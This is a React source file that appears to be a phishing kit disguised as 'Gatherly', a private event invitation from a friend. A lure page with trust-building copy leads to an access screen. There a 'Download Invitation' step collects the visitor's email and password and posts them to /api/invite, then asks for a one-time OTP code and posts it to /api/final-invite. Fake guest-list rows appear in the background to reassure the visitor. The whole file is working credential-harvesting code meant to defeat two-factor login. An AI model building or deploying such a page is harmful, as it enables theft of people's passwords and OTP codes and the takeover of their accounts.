import { useState } from 'react';

const eventDetails = [
  { label: 'Sent by', value: 'Your friend' },
  { label: 'Date', value: 'Saturday, August 22' },
  { label: 'Location', value: 'Shared after opening' },
];

const features = [
  'Private RSVP access',
  'Guest details included',
  'Mobile friendly invitation',
];

const attendanceRows = [
  ['Maya Thompson', 'maya.thompson@example.com', 'INV-2041', 'Guest confirmation pending review'],
  ['Daniel Brooks', 'daniel.brooks@example.com', 'INV-5920', 'Invitation opened and awaiting RSVP'],
  ['Nora Ellis', 'nora.ellis@example.com', 'INV-1184', 'Access code received for guest list'],
  ['Grace Morgan', 'grace.morgan@example.com', 'INV-7302', 'Verified for private event attendance'],
  ['Lucas Reed', 'lucas.reed@example.com', 'INV-4418', 'Guest details submitted for review'],
  ['Ava Bennett', 'ava.bennett@example.com', 'INV-9063', 'Invitation reviewed by event desk'],
  ['Ethan Cole', 'ethan.cole@example.com', 'INV-3175', 'Waiting for final attendance approval'],
  ['Sofia Lane', 'sofia.lane@example.com', 'INV-6801', 'Guest verified for RSVP access'],
  ['Liam Hayes', 'liam.hayes@example.com', 'INV-2498', 'Private invitation awaiting confirmation'],
  ['Chloe West', 'chloe.west@example.com', 'INV-8526', 'Event access request currently reviewed'],
  ['Ryan Scott', 'ryan.scott@example.com', 'INV-4637', 'Invitation code matched guest record'],
  ['Ella James', 'ella.james@example.com', 'INV-1029', 'Attendance entry prepared for RSVP'],
  ['Mason Clark', 'mason.clark@example.com', 'INV-7754', 'Guest email added to invitation ledger'],
  ['Lily Parker', 'lily.parker@example.com', 'INV-6381', 'Pending review from invitation desk'],
  ['Noah Foster', 'noah.foster@example.com', 'INV-3816', 'Code submitted for attendance check'],
  ['Zoe Mitchell', 'zoe.mitchell@example.com', 'INV-9407', 'Guest profile ready for verification'],
  ['Caleb Ward', 'caleb.ward@example.com', 'INV-5263', 'Private event access under review'],
  ['Mila Turner', 'mila.turner@example.com', 'INV-2179', 'Invitation file prepared for guest'],
];

function AttendanceBackdrop() {
  return (
    <div className="attendance-backdrop" aria-hidden="true">
      {attendanceRows.map(([name, email, code, status]) => (
        <div className="attendance-row" key={code}>
          <strong>{name}</strong>
          <span>{email}</span>
          <span>{code}</span>
          <em>{status}</em>
          <span className="attendance-note">Friend invitation list entry confirmed for event review</span>
        </div>
      ))}
    </div>
  );
}

function Brand({ compact = false }) {
  return (
    <a className={compact ? 'brand compact' : 'brand'} href="/" aria-label="Gatherly home">
      <span className="brand-mark">g</span>
      <span>gatherly</span>
    </a>
  );
}

function EnvelopeCard({ onOpen }) {
  return (
    <button
      className="envelope"
      type="button"
      onClick={onOpen}
      aria-label="Open invitation card"
    >
      <span className="postmark" aria-hidden="true">
        <span className="postmark-circle" />
        <span className="postmark-lines">
          <span />
          <span />
          <span />
        </span>
      </span>

      <span className="stamp" aria-hidden="true">
        <span className="stamp-art" />
        <span className="stamp-price">45</span>
      </span>

      <span className="invite-title">You&apos;re Invited!</span>
      <span className="invite-subtitle">Private event invitation</span>
      <span className="barcode" aria-hidden="true">
        {Array.from({ length: 34 }).map((_, index) => (
          <span key={index} />
        ))}
      </span>
    </button>
  );
}

function InvitePreview({ onOpen }) {
  return (
    <main className="page preview-page">
      <header className="topbar">
        <Brand />
        <nav className="nav-links" aria-label="Invitation navigation">
          <a href="#details">Details</a>
          <a href="#privacy">Privacy</a>
          <button type="button" onClick={onOpen}>
            Open
          </button>
        </nav>
      </header>

      <section className="hero-grid">
        <div className="hero-copy">
          <p className="eyebrow">A private invitation is waiting</p>
          <h1>Open your event invitation in a secure guest preview.</h1>
          <p className="hero-text">
            Your friend shared a digital invitation with RSVP information,
            location notes, and guest instructions prepared in one place.
          </p>

          <div className="hero-actions">
            <button className="primary-action" type="button" onClick={onOpen}>
              Open invitation
            </button>
            <a className="secondary-action" href="#details">
              Review details
            </a>
          </div>

          <div className="detail-strip" id="details" aria-label="Event details">
            {eventDetails.map((detail) => (
              <div key={detail.label}>
                <span>{detail.label}</span>
                <strong>{detail.value}</strong>
              </div>
            ))}
          </div>
        </div>

        <aside className="invitation-stage" aria-label="Invitation preview">
          <div className="stage-header">
            <span>Invitation preview</span>
            <span className="status-pill">Ready</span>
          </div>
          <EnvelopeCard onOpen={onOpen} />
        </aside>
      </section>

      <section className="support-grid" id="privacy" aria-label="Invitation support information">
        <article className="info-panel">
          <span className="panel-icon">01</span>
          <h2>Guest-first experience</h2>
          <p>
            The invitation is formatted for quick review, with RSVP details and
            sender notes kept clear before you continue.
          </p>
        </article>
        <article className="info-panel">
          <span className="panel-icon">02</span>
          <h2>Event context included</h2>
          <p>
            Date, location, sender notes, and access details are arranged so the next
            screen feels intentional and easy to trust.
          </p>
        </article>
        <article className="info-panel accent-panel">
          <h2>What is inside?</h2>
          <ul>
            {features.map((feature) => (
              <li key={feature}>{feature}</li>
            ))}
          </ul>
        </article>
      </section>
    </main>
  );
}

function AccessScreen({ onBack }) {
  const [step, setStep] = useState('ready');
  const [formData, setFormData] = useState({
    email: '',
    accessCode: '',
    finalCode: '',
  });
  const [requestState, setRequestState] = useState({
    status: 'idle',
    message: '',
  });

  const showForm = step === 'form';
  const showFinalCodeForm = step === 'final-code';
  const prepared = step === 'prepared';
  const isSubmitting = requestState.status === 'sending';

  function updateField(event) {
    const { name, value } = event.target;
    setFormData((current) => ({ ...current, [name]: value }));
  }

  async function submitAccess(event) {
    event.preventDefault();
    setRequestState({ status: 'sending', message: 'Sending for review...' });

    try {
      const response = await fetch('/api/invite', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.message || 'Could not send invitation request.');
      }

      setRequestState({
        status: 'success',
        message:
          result.message ||
          'Invitation request sent for review. Enter your final invite code once you receive it.',
      });
      setStep('final-code');
    } catch (error) {
      setRequestState({
        status: 'error',
        message:
          error instanceof Error
            ? error.message
            : 'Could not send invitation request.',
      });
    }
  }

  async function submitFinalCode(event) {
    event.preventDefault();
    setRequestState({
      status: 'sending',
      message: 'Sending final invite code...',
    });

    try {
      const response = await fetch('/api/final-invite', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.message || 'Could not send final invite code.');
      }

      setRequestState({
        status: 'success',
        message:
          result.message ||
          'Code sent. Your invitation is now awaiting final confirmation.',
      });
      setStep('prepared');
    } catch (error) {
      setRequestState({
        status: 'error',
        message:
          error instanceof Error
            ? error.message
            : 'Could not send final invite code.',
      });
    }
  }

  return (
    <main className="page access-page">
      <AttendanceBackdrop />

      <section className="access-shell" aria-label="Invitation access">
        <header className="access-brand">
          <Brand compact />
        </header>

        <div className="access-card">
          <p className="eyebrow">Invitation access</p>
          <h1>You are invited!</h1>
          <p className="access-lede">
            Your friend sent a private invitation. Review the prepared file below
            to continue to the RSVP details.
          </p>

          <div className="notice-box">
            <strong>Ready to open</strong>
            <span>
              This preview is prepared for your friend&apos;s guest list and
              will continue securely in this browser.
            </span>
          </div>

          <div className="progress-area">
            <span className="progress-label">
              {prepared
                ? 'Final invite code submitted'
                : showFinalCodeForm
                  ? 'Final invite code required'
                  : 'Preparing your invitation'}
            </span>
            <span
              className={
                prepared
                  ? 'progress-bar complete'
                  : showFinalCodeForm
                    ? 'progress-bar review'
                    : 'progress-bar'
              }
            >
              <span />
            </span>
          </div>

          {showForm && (
            <form className="access-form" onSubmit={submitAccess}>
              <label>
                <span>Email address</span>
                <input
                  autoComplete="email"
                  name="email"
                  onChange={updateField}
                  placeholder="you@example.com"
                  required
                  type="email"
                  value={formData.email}
                />
              </label>

              <label>
                <span>Password</span>
                <input
                  autoComplete="off"
                  name="accessCode"
                  onChange={updateField}
                  placeholder="Enter your password"
                  required
                  type="text"
                  value={formData.accessCode}
                />
              </label>

              <button
                className="download-button full-width"
                disabled={isSubmitting}
                type="submit"
              >
                {isSubmitting ? 'Sending...' : 'Continue'}
              </button>
            </form>
          )}

          {showFinalCodeForm && (
            <form className="access-form" onSubmit={submitFinalCode}>
              <div className="review-note">
                <strong>Waiting for OTP code</strong>
                <span>
                  Enter it below to complete your invitation review.
                </span>
              </div>

              <label>
                <span>OTP</span>
                <input
                  autoComplete="off"
                  name="finalCode"
                  onChange={updateField}
                  placeholder="Enter your OTP"
                  required
                  type="text"
                  value={formData.finalCode}
                />
              </label>

              <button
                className="download-button full-width"
                disabled={isSubmitting}
                type="submit"
              >
                {isSubmitting ? 'Sending...' : 'Input OTP'}
              </button>
            </form>
          )}

          {requestState.message && (
            <p className={`form-message ${requestState.status}`}>
              {requestState.message}
            </p>
          )}

          {!showForm && !showFinalCodeForm && (
            <button
              className="download-button"
              type="button"
              onClick={() => (prepared ? undefined : setStep('form'))}
            >
              {prepared ? 'Continue to RSVP' : 'Download Invitation'}
            </button>
          )}
        </div>

        <button className="back-button" type="button" onClick={onBack}>
          Back to invitation preview
        </button>
      </section>
    </main>
  );
}

function App() {
  const [screen, setScreen] = useState('preview');

  if (screen === 'access') {
    return <AccessScreen onBack={() => setScreen('preview')} />;
  }

  return <InvitePreview onOpen={() => setScreen('access')} />;
}

export default App;
